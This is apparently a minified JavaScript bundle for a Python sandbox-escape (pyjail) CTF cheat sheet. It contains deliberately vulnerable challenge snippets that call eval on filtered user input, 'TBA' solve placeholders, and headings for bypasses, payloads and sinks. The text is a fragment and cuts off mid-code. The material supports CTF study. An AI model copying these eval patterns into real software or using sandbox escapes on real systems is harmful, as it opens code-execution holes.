TBA</span></code>',Oo,ks,va,Lc,Uo,rs,Ct,Lt,Tc,Bo,_s,br=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">72</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token string">"__"</span> <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Mo,fs,Tt,Ft,Fc,qo,ds,mr='<code class="language-py"><span class="token comment"># TBA</span></code>',No,ys,wa,Hc,jo,bs,Ht,Rt,Rc,So,ms,vr=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-z0-9]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">130</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,zo,vs,Dt,It,Dc,Yo,ws,wr='<code class="language-py"><span class="token comment"># TBA</span></code>',Wo,gs,ga,Ic,Vo,Es,Pt,Ot,Pc,Go,hs,gr=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'd'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,$o,xs,Ut,Bt,Oc,Xo,As,Er='<code class="language-py"><span class="token comment"># TBA</span></code>',Ko,Cs,Ea,Uc,Zo,Ls,Mt,qt,Bc,Jo,Ts,hr=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[123456789]'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'('</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,Qo,Fs,Nt,jt,Mc,ne,Hs,xr='<code class="language-py"><span class="token comment"># TBA</span></code>',se,Rs,ha,qc,ae,Ds,St,zt,Nc,te,Is,Ar=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-m]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,pe,Ps,Yt,Wt,jc,oe,Os,Cr='<code class="language-py"><span class="token comment"># TBA</span></code>',ee,Us,xa,Sc,ce,Bs,Vt,Gt,zc,le,Ms,Lr=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[n-z]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,ue,qs,$t,Xt,Yc,ie,Ns,Tr='<code class="language-py"><span class="token comment"># TBA</span></code>',ke,js,Aa,Wc,re,m,Kt,L,Vc,Gc,Zt,T,$c,Xc,Jt,F,Kc;return{c(){f=a("blockquote"),b=a("p"),w=k("Notice: This document will be continuously updated."),H=u(),_=a("h2"),d=a("a"),zs=k("Sinks"),Qt=u(),R=a("h3"),Ys=a("a"),de=k("retrieving builtins"),np=u(),D=a("pre"),sp=u(),I=a("h3"),Ws=a("a"),ye=k("good to know built-in functions and methods"),ap=u(),P=a("pre"),tp=u(),O=a("h3"),Vs=a("a"),be=k("subclasses"),pp=u(),U=a("pre"),op=u(),B=a("h3"),Gs=a("a"),me=k("popular modules"),ep=u(),M=a("pre"),cp=u(),q=a("h2"),$s=a("a"),ve=k("Bypasses and payloads"),lp=u(),N=a("h3"),Xs=a("a"),we=k("decorators"),up=u(),j=a("pre"),ip=u(),S=a("h3"),Ks=a("a"),ge=k("unicode bypass"),kp=u(),z=a("pre"),rp=u(),Y=a("h3"),Zs=a("a"),Ee=k("assigning fields and variables"),_p=u(),W=a("pre"),fp=u(),V=a("pre"),dp=u(),G=a("h3"),Js=a("a"),he=k("deleting variables"),yp=u(),$=a("pre"),bp=u(),X=a("h3"),Qs=a("a"),xe=k("getting attributes without dot"),mp=u(),K=a("pre"),vp=u(),Z=a("h3"),na=a("a"),Ae=k("getting attributes without underscore"),wp=u(),J=a("pre"),gp=u(),Q=a("h3"),sa=a("a"),Ce=k("running functions and methods without parenthesis"),Ep=u(),nn=a("pre"),hp=u(),sn=a("h2"),aa=a("a"),Le=k("General stuff"),xp=u(),an=a("h3"),ta=a("a"),Te=k("environment variables"),Ap=u(),g=a("ul"),La=a("li"),E=a("a"),Fe=k("https://www.elttam.com/blog/env/#python"),He=u(),y=a("li"),Ta=a("code"),Re=k("PYTHONINSPECT"),De=k(", "),Fa=a("code"),Ie=k("PYTHONHOME"),Pe=k(", "),Ha=a("code"),Oe=k("PYTHONPATH"),Ue=k(", "),Ra=a("code"),Be=k("PYTHONWARNINGS"),Me=k(", "),Da=a("code"),qe=k("BROWSER"),Cp=u(),tn=a("h3"),pa=a("a"),Ne=k("magic methods"),Lp=u(),pn=a("ul"),Ia=a("li"),h=a("a"),je=k("https://rszalski.github.io/magicmethods/#appendix1"),Tp=u(),on=a("h3"),oa=a("a"),Se=k("stable payloads"),Fp=u(),en=a("pre"),Hp=u(),cn=a("h3"),ea=a("a"),ze=k("finding sinks from modules"),Rp=u(),x=a("ul"),Pa=a("li"),A=a("a"),Ye=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),We=u(),Oa=a("li"),C=a("a"),Ve=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),Dp=u(),ln=a("h2"),ca=a("a"),Ge=k("CTF"),Ip=u(),un=a("h3"),la=a("a"),$e=k("vsCTF 2024: llama-jail-revenge"),Pp=u(),kn=a("ul"),Ua=a("li"),Ba=a("code"),Xe=k("chall.py"),Op=u(),rn=a("pre"),Up=u(),_n=a("ul"),Ma=a("li"),qa=a("code"),Ke=k("exec_utils.py"),Bp=u(),fn=a("pre"),Mp=u(),dn=a("ul"),Na=a("li"),ja=a("code"),Ze=k("solve.py"),qp=u(),yn=a("pre"),Np=u(),bn=a("h3"),ua=a("a"),Je=k("GlacierCTF 2023: Avatar"),jp=u(),mn=a("ul"),Sa=a("li"),za=a("code"),Qe=k("server.py"),Sp=u(),vn=a("pre"),zp=u(),wn=a("ul"),Ya=a("li"),Wa=a("code"),nc=k("solve.py"),Yp=u(),gn=a("pre"),Wp=u(),En=a("h3"),ia=a("a"),sc=k("TFC CTF 2023: My Third Calculator"),Vp=u(),hn=a("ul"),Va=a("li"),Ga=a("code"),ac=k("server.py"),Gp=u(),xn=a("pre"),$p=u(),An=a("ul"),$a=a("li"),Xa=a("code"),tc=k("solve.py"),Xp=u(),Cn=a("pre"),Kp=u(),Ln=a("h3"),ka=a("a"),pc=k("Equinor CTF 2023: Dis is it!"),Zp=u(),Tn=a("ul"),Ka=a("li"),Za=a("code"),oc=k("main.py"),Jp=u(),Fn=a("pre"),Qp=u(),Hn=a("ul"),Ja=a("li"),Qa=a("code"),ec=k("solve.py"),no=u(),Rn=a("pre"),so=u(),Dn=a("h3"),ra=a("a"),cc=k("37C3 Potluck CTF: tacocat"),ao=u(),In=a("ul"),nt=a("li"),st=a("code"),lc=k("main.py"),to=u(),Pn=a("pre"),po=u(),On=a("ul"),at=a("li"),tt=a("code"),uc=k("solve.py"),oo=u(),Un=a("pre"),eo=u(),Bn=a("h3"),_a=a("a"),ic=k("Internet Festival 2023 CTF Finals: prison"),co=u(),Mn=a("ul"),pt=a("li"),ot=a("code"),kc=k("prison.py"),lo=u(),qn=a("pre"),uo=u(),Nn=a("ul"),et=a("li"),ct=a("code"),rc=k("solve.py"),io=u(),jn=a("pre"),ko=u(),Sn=a("h3"),fa=a("a"),_c=k("WACON 2023 Prequal: ScavengerHunt"),ro=u(),zn=a("ul"),lt=a("li"),ut=a("code"),fc=k("prob.py"),_o=u(),Yn=a("pre"),fo=u(),Wn=a("ul"),it=a("li"),kt=a("code"),dc=k("secret.py"),yo=u(),Vn=a("pre"),bo=u(),Gn=a("ul"),rt=a("li"),_t=a("code"),yc=k("solve.py"),mo=u(),$n=a("pre"),vo=u(),Xn=a("h3"),da=a("a"),bc=k("CrewCTF 2023: starship-1"),wo=u(),Kn=a("ul"),ft=a("li"),dt=a("code"),mc=k("sandbox.py"),go=u(),Zn=a("pre"),Eo=u(),Jn=a("ul"),yt=a("li"),bt=a("code"),vc=k("solve.py"),ho=u(),Qn=a("pre"),xo=u(),ns=a("h3"),ya=a("a"),wc=k("CrewCTF 2023: starship"),Ao=u(),ss=a("ul"),mt=a("li"),vt=a("code"),gc=k("solve.py"),Co=u(),as=a("pre"),Lo=u(),ts=a("h3"),ba=a("a"),Ec=k("CrewCTF 2023: setjail"),To=u(),ps=a("ul"),wt=a("li"),gt=a("code"),hc=k("solve.py"),Fo=u(),os=a("pre"),Ho=u(),es=a("h3"),ma=a("a"),xc=k("BYUCTF 2023: Builtins 1"),Ro=u(),cs=a("ul"),Et=a("li"),ht=a("code"),Ac=k("b1.py"),Do=u(),ls=a("pre"),Io=u(),us=a("ul"),xt=a("li"),At=a("code"),Cc=k("solve.py"),Po=u(),is=a("pre"),Oo=u(),ks=a("h3"),va=a("a"),Lc=k("BYUCTF 2023: Builtins 2"),Uo=u(),rs=a("ul"),Ct=a("li"),Lt=a("code"),Tc=k("b2.py"),Bo=u(),_s=a("pre"),Mo=u(),fs=a("ul"),Tt=a("li"),Ft=a("code"),Fc=k("solve.py"),qo=u(),ds=a("pre"),No=u(),ys=a("h3"),wa=a("a"),Hc=k("BYUCTF 2023: a-z0-9"),jo=u(),bs=a("ul"),Ht=a("li"),Rt=a("code"),Rc=k("a-z0-9.py"),So=u(),ms=a("pre"),zo=u(),vs=a("ul"),Dt=a("li"),It=a("code"),Dc=k("solve.py"),Yo=u(),ws=a("pre"),Wo=u(),gs=a("h3"),ga=a("a"),Ic=k("BYUCTF 2023: Leet 1"),Vo=u(),Es=a("ul"),Pt=a("li"),Ot=a("code"),Pc=k("leet1.py"),Go=u(),hs=a("pre"),$o=u(),xs=a("ul"),Ut=a("li"),Bt=a("code"),Oc=k("solve.py"),Xo=u(),As=a("pre"),Ko=u(),Cs=a("h3"),Ea=a("a"),Uc=k("BYUCTF 2023: Leet 2"),Zo=u(),Ls=a("ul"),Mt=a("li"),qt=a("code"),Bc=k("leet2.py"),Jo=u(),Ts=a("pre"),Qo=u(),Fs=a("ul"),Nt=a("li"),jt=a("code"),Mc=k("solve.py"),ne=u(),Hs=a("pre"),se=u(),Rs=a("h3"),ha=a("a"),qc=k("BYUCTF 2023: abcdefghijklm"),ae=u(),Ds=a("ul"),St=a("li"),zt=a("code"),Nc=k("abcdefghijklm.py"),te=u(),Is=a("pre"),pe=u(),Ps=a("ul"),Yt=a("li"),Wt=a("code"),jc=k("solve.py"),oe=u(),Os=a("pre"),ee=u(),Us=a("h3"),xa=a("a"),Sc=k("BYUCTF 2023: nopqrstuvwxyz"),ce=u(),Bs=a("ul"),Vt=a("li"),Gt=a("code"),zc=k("nopqrstuvwxyz.py"),le=u(),Ms=a("pre"),ue=u(),qs=a("ul"),$t=a("li"),Xt=a("code"),Yc=k("solve.py"),ie=u(),Ns=a("pre"),ke=u(),js=a("h2"),Aa=a("a"),Wc=k("References"),re=u(),m=a("ul"),Kt=a("li"),L=a("a"),Vc=k("https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),Gc=u(),Zt=a("li"),T=a("a"),$c=k("https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Xc=u(),Jt=a("li"),F=a("a"),Kc=k("https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),this.h()},l(n){f=t(n,"BLOCKQUOTE",{});var o=p(f);b=t(o,"P",{});var Jc=p(b);w=r(Jc,"Notice: This document will be continuously updated."),Jc.forEach(s),o.forEach(s),H=i(n),_=t(n,"H2",{id:!0});var Qc=p(_);d=t(Qc,"A",{href:!0});var nl=p(d);zs=r(nl,"Sinks"),nl.forEach(s),Qc.forEach(s),Qt=i(n),R=t(n,"H3",{id:!0});var sl=p(R);Ys=t(sl,"A",{href:!0});var al=p(Ys);de=r(al,"retrieving builtins"),al.forEach(s),sl.forEach(s),np=i(n),D=t(n,"PRE",{class:!0});var Fr=p(D);Fr.forEach(s),sp=i(n),I=t(n,"H3",{id:!0});var tl=p(I);Ws=t(tl,"A",{href:!0});var pl=p(Ws);ye=r(pl,"good to know built-in functions and methods"),pl.forEach(s),tl.forEach(s),ap=i(n),P=t(n,"PRE",{class:!0});var Hr=p(P);Hr.forEach(s),tp=i(n),O=t(n,"H3",{id:!0});var ol=p(O);Vs=t(ol,"A",{href:!0});var el=p(Vs);be=r(el,"subclasses"),el.forEach(s),ol.forEach(s),pp=i(n),U=t(n,"PRE",{class:!0});var Rr=p(U);Rr.forEach(s),op=i(n),B=t(n,"H3",{id:!0});var cl=p(B);Gs=t(cl,"A",{href:!0});var ll=p(Gs);me=r(ll,"popular modules"),ll.forEach(s),cl.forEach(s),ep=i(n),M=t(n,"PRE",{class:!0});var Dr=p(M);Dr.forEach(s),cp=i(n),q=t(n,"H2",{id:!0});var ul=p(q);$s=t(ul,"A",{href:!0});var il=p($s);ve=r(il,"Bypasses and payloads"),il.forEach(s),ul.forEach(s),lp=i(n),N=t(n,"H3",{id:!0});var kl=p(N);Xs=t(kl,"A",{href:!0});var rl=p(Xs);we=r(rl,"decorators"),rl.forEach(s),kl.forEach(s),up=i(n),j=t(n,"PRE",{class:!0});var Ir=p(j);Ir.forEach(s),ip=i(n),S=t(n,"H3",{id:!0});var _l=p(S);Ks=t(_l,"A",{href:!0});var fl=p(Ks);ge=r(fl,"unicode bypass"),fl.forEach(s),_l.forEach(s),kp=i(n),z=t(n,"PRE",{class:!0});var Pr=p(z);Pr.forEach(s),rp=i(n),Y=t(n,"H3",{id:!0});var dl=p(Y);Zs=t(dl,"A",{href:!0});var yl=p(Zs);Ee=r(yl,"assigning fields and variables"),yl.forEach(s),dl.forEach(s),_p=i(n),W=t(n,"PRE",{class:!0});var Or=p(W);Or.forEach(s),fp=i(n),V=t(n,"PRE",{class:!0});var Ur=p(V);Ur.forEach(s),dp=i(n),G=t(n,"H3",{id:!0});var bl=p(G);Js=t(bl,"A",{href:!0});var ml=p(Js);he=r(ml,"deleting variables"),ml.forEach(s),bl.forEach(s),yp=i(n),$=t(n,"PRE",{class:!0});var Br=p($);Br.forEach(s),bp=i(n),X=t(n,"H3",{id:!0});var vl=p(X);Qs=t(vl,"A",{href:!0});var wl=p(Qs);xe=r(wl,"getting attributes without dot"),wl.forEach(s),vl.forEach(s),mp=i(n),K=t(n,"PRE",{class:!0});var Mr=p(K);Mr.forEach(s),vp=i(n),Z=t(n,"H3",{id:!0});var gl=p(Z);na=t(gl,"A",{href:!0});var El=p(na);Ae=r(El,"getting attributes without underscore"),El.forEach(s),gl.forEach(s),wp=i(n),J=t(n,"PRE",{class:!0});var qr=p(J);qr.forEach(s),gp=i(n),Q=t(n,"H3",{id:!0});var hl=p(Q);sa=t(hl,"A",{href:!0});var xl=p(sa);Ce=r(xl,"running functions and methods without parenthesis"),xl.forEach(s),hl.forEach(s),Ep=i(n),nn=t(n,"PRE",{class:!0});var Nr=p(nn);Nr.forEach(s),hp=i(n),sn=t(n,"H2",{id:!0});var Al=p(sn);aa=t(Al,"A",{href:!0});var Cl=p(aa);Le=r(Cl,"General stuff"),Cl.forEach(s),Al.forEach(s),xp=i(n),an=t(n,"H3",{id:!0});var Ll=p(an);ta=t(Ll,"A",{href:!0});var Tl=p(ta);Te=r(Tl,"environment variables"),Tl.forEach(s),Ll.forEach(s),Ap=i(n),g=t(n,"UL",{class:!0});var _e=p(g);La=t(_e,"LI",{});var Fl=p(La);E=t(Fl,"A",{href:!0,rel:!0,class:!0,target:!0});var Hl=p(E);Fe=r(Hl,"https://www.elttam.com/blog/env/#python"),Hl.forEach(s),Fl.forEach(s),He=i(_e),y=t(_e,"LI",{});var v=p(y);Ta=t(v,"CODE",{});var Rl=p(Ta);Re=r(Rl,"PYTHONINSPECT"),Rl.forEach(s),De=r(v,", "),Fa=t(v,"CODE",{});var Dl=p(Fa);Ie=r(Dl,"PYTHONHOME"),Dl.forEach(s),Pe=r(v,", "),Ha=t(v,"CODE",{});var Il=p(Ha);Oe=r(Il,"PYTHONPATH"),Il.forEach(s),Ue=r(v,", "),Ra=t(v,"CODE",{});var Pl=p(Ra);Be=r(Pl,"PYTHONWARNINGS"),Pl.forEach(s),Me=r(v,", "),Da=t(v,"CODE",{});var Ol=p(Da);qe=r(Ol,"BROWSER"),Ol.forEach(s),v.forEach(s),_e.forEach(s),Cp=i(n),tn=t(n,"H3",{id:!0});var Ul=p(tn);pa=t(Ul,"A",{href:!0});var Bl=p(pa);Ne=r(Bl,"magic methods"),Bl.forEach(s),Ul.forEach(s),Lp=i(n),pn=t(n,"UL",{class:!0});var Ml=p(pn);Ia=t(Ml,"LI",{});var ql=p(Ia);h=t(ql,"A",{href:!0,rel:!0,class:!0,target:!0});var Nl=p(h);je=r(Nl,"https://rszalski.github.io/magicmethods/#appendix1"),Nl.forEach(s),ql.forEach(s),Ml.forEach(s),Tp=i(n),on=t(n,"H3",{id:!0});var jl=p(on);oa=t(jl,"A",{href:!0});var Sl=p(oa);Se=r(Sl,"stable payloads"),Sl.forEach(s),jl.forEach(s),Fp=i(n),en=t(n,"PRE",{class:!0});var jr=p(en);jr.forEach(s),Hp=i(n),cn=t(n,"H3",{id:!0});var zl=p(cn);ea=t(zl,"A",{href:!0});var Yl=p(ea);ze=r(Yl,"finding sinks from modules"),Yl.forEach(s),zl.forEach(s),Rp=i(n),x=t(n,"UL",{class:!0});var fe=p(x);Pa=t(fe,"LI",{});var Wl=p(Pa);A=t(Wl,"A",{href:!0,rel:!0,class:!0,target:!0});var Vl=p(A);Ye=r(Vl,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),Vl.forEach(s),Wl.forEach(s),We=i(fe),Oa=t(fe,"LI",{});var Gl=p(Oa);C=t(Gl,"A",{href:!0,rel:!0,class:!0,target:!0});var $l=p(C);Ve=r($l,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),$l.forEach(s),Gl.forEach(s),fe.forEach(s),Dp=i(n),ln=t(n,"H2",{id:!0});var Xl=p(ln);ca=t(Xl,"A",{href:!0});var Kl=p(ca);Ge=r(Kl,"CTF"),Kl.forEach(s),Xl.forEach(s),Ip=i(n),un=t(n,"H3",{id:!0});var Zl=p(un);la=t(Zl,"A",{href:!0});var Jl=p(la);$e=r(Jl,"vsCTF 2024: llama-jail-revenge"),Jl.forEach(s),Zl.forEach(s),Pp=i(n),kn=t(n,"UL",{class:!0});var Ql=p(kn);Ua=t(Ql,"LI",{});var nu=p(Ua);Ba=t(nu,"CODE",{});var su=p(Ba);Xe=r(su,"chall.py"),su.forEach(s),nu.forEach(s),Ql.forEach(s),Op=i(n),rn=t(n,"PRE",{class:!0});var Sr=p(rn);Sr.forEach(s),Up=i(n),_n=t(n,"UL",{class:!0});var au=p(_n);Ma=t(au,"LI",{});var tu=p(Ma);qa=t(tu,"CODE",{});var pu=p(qa);Ke=r(pu,"exec_utils.py"),pu.forEach(s),tu.forEach(s),au.forEach(s),Bp=i(n),fn=t(n,"PRE",{class:!0});var zr=p(fn);zr.forEach(s),Mp=i(n),dn=t(n,"UL",{class:!0});var ou=p(dn);Na=t(ou,"LI",{});var eu=p(Na);ja=t(eu,"CODE",{});var cu=p(ja);Ze=r(cu,"solve.py"),cu.forEach(s),eu.forEach(s),ou.forEach(s),qp=i(n),yn=t(n,"PRE",{class:!0});var Yr=p(yn);Yr.forEach(s),Np=i(n),bn=t(n,"H3",{id:!0});var lu=p(bn);ua=t(lu,"A",{href:!0});var uu=p(ua);Je=r(uu,"GlacierCTF 2023: Avatar"),uu.forEach(s),lu.forEach(s),jp=i(n),mn=t(n,"UL",{class:!0});var iu=p(mn);Sa=t(iu,"LI",{});var ku=p(Sa);za=t(ku,"CODE",{});var ru=p(za);Qe=r(ru,"server.py"),ru.forEach(s),ku.forEach(s),iu.forEach(s),Sp=i(n),vn=t(n,"PRE",{class:!0});var Wr=p(vn);Wr.forEach(s),zp=i(n),wn=t(n,"UL",{class:!0});var _u=p(wn);Ya=t(_u,"LI",{});var fu=p(Ya);Wa=t(fu,"CODE",{});var du=p(Wa);nc=r(du,"solve.py"),du.forEach(s),fu.forEach(s),_u.forEach(s),Yp=i(n),gn=t(n,"PRE",{class:!0});var Vr=p(gn);Vr.forEach(s),Wp=i(n),En=t(n,"H3",{id:!0});var yu=p(En);ia=t(yu,"A",{href:!0});var bu=p(ia);sc=r(bu,"TFC CTF 2023: My Third Calculator"),bu.forEach(s),yu.forEach(s),Vp=i(n),hn=t(n,"UL",{class:!0});var mu=p(hn);Va=t(mu,"LI",{});var vu=p(Va);Ga=t(vu,"CODE",{});var wu=p(Ga);ac=r(wu,"server.py"),wu.forEach(s),vu.forEach(s),mu.forEach(s),Gp=i(n),xn=t(n,"PRE",{class:!0});var Gr=p(xn);Gr.forEach(s),$p=i(n),An=t(n,"UL",{class:!0});var gu=p(An);$a=t(gu,"LI",{});var Eu=p($a);Xa=t(Eu,"CODE",{});var hu=p(Xa);tc=r(hu,"solve.py"),hu.forEach(s),Eu.forEach(s),gu.forEach(s),Xp=i(n),Cn=t(n,"PRE",{class:!0});var $r=p(Cn);$r.forEach(s),Kp=i(n),Ln=t(n,"H3",{id:!0});var xu=p(Ln);ka=t(xu,"A",{href:!0});var Au=p(ka);pc=r(Au,"Equinor CTF 2023: Dis is it!"),Au.forEach(s),xu.forEach(s),Zp=i(n),Tn=t(n,"UL",{class:!0});var Cu=p(Tn);Ka=t(Cu,"LI",{});var Lu=p(Ka);Za=t(Lu,"CODE",{});var Tu=p(Za);oc=r(Tu,"main.py"),Tu.forEach(s),Lu.forEach(s),Cu.forEach(s),Jp=i(n),Fn=t(n,"PRE",{class:!0});var Xr=p(Fn);Xr.forEach(s),Qp=i(n),Hn=t(n,"UL",{class:!0});var Fu=p(Hn);Ja=t(Fu,"LI",{});var Hu=p(Ja);Qa=t(Hu,"CODE",{});var Ru=p(Qa);ec=r(Ru,"solve.py"),Ru.forEach(s),Hu.forEach(s),Fu.forEach(s),no=i(n),Rn=t(n,"PRE",{class:!0});var Kr=p(Rn);Kr.forEach(s),so=i(n),Dn=t(n,"H3",{id:!0});var Du=p(Dn);ra=t(Du,"A",{href:!0});var Iu=p(ra);cc=r(Iu,"37C3 Potluck CTF: tacocat"),Iu.forEach(s),Du.forEach(s),ao=i(n),In=t(n,"UL",{class:!0});var Pu=p(In);nt=t(Pu,"LI",{});var Ou=p(nt);st=t(Ou,"CODE",{});var Uu=p(st);lc=r(Uu,"main.py"),Uu.forEach(s),Ou.forEach(s),Pu.forEach(s),to=i(n),Pn=t(n,"PRE",{class:!0});var Zr=p(Pn);Zr.forEach(s),po=i(n),On=t(n,"UL",{class:!0});var Bu=p(On);at=t(Bu,"LI",{});var Mu=p(at);tt=t(Mu,"CODE",{});var qu=p(tt);uc=r(qu,"solve.py"),qu.forEach(s),Mu.forEach(s),Bu.forEach(s),oo=i(n),Un=t(n,"PRE",{class:!0});var Jr=p(Un);Jr.forEach(s),eo=i(n),Bn=t(n,"H3",{id:!0});var Nu=p(Bn);_a=t(Nu,"A",{href:!0});var ju=p(_a);ic=r(ju,"Internet Festival 2023 CTF Finals: prison"),ju.forEach(s),Nu.forEach(s),co=i(n),Mn=t(n,"UL",{class:!0});var Su=p(Mn);pt=t(Su,"LI",{});var zu=p(pt);ot=t(zu,"CODE",{});var Yu=p(ot);kc=r(Yu,"prison.py"),Yu.forEach(s),zu.forEach(s),Su.forEach(s),lo=i(n),qn=t(n,"PRE",{class:!0});var Qr=p(qn);Qr.forEach(s),uo=i(n),Nn=t(n,"UL",{class:!0});var Wu=p(Nn);et=t(Wu,"LI",{});var Vu=p(et);ct=t(Vu,"CODE",{});var Gu=p(ct);rc=r(Gu,"solve.py"),Gu.forEach(s),Vu.forEach(s),Wu.forEach(s),io=i(n),jn=t(n,"PRE",{class:!0});var n_=p(jn);n_.forEach(s),ko=i(n),Sn=t(n,"H3",{id:!0});var $u=p(Sn);fa=t($u,"A",{href:!0});var Xu=p(fa);_c=r(Xu,"WACON 2023 Prequal: ScavengerHunt"),Xu.forEach(s),$u.forEach(s),ro=i(n),zn=t(n,"UL",{class:!0});var Ku=p(zn);lt=t(Ku,"LI",{});var Zu=p(lt);ut=t(Zu,"CODE",{});var Ju=p(ut);fc=r(Ju,"prob.py"),Ju.forEach(s),Zu.forEach(s),Ku.forEach(s),_o=i(n),Yn=t(n,"PRE",{class:!0});var s_=p(Yn);s_.forEach(s),fo=i(n),Wn=t(n,"UL",{class:!0});var Qu=p(Wn);it=t(Qu,"LI",{});var ni=p(it);kt=t(ni,"CODE",{});var si=p(kt);dc=r(si,"secret.py"),si.forEach(s),ni.forEach(s),Qu.forEach(s),yo=i(n),Vn=t(n,"PRE",{class:!0});var a_=p(Vn);a_.forEach(s),bo=i(n),Gn=t(n,"UL",{class:!0});var ai=p(Gn);rt=t(ai,"LI",{});var ti=p(rt);_t=t(ti,"CODE",{});var 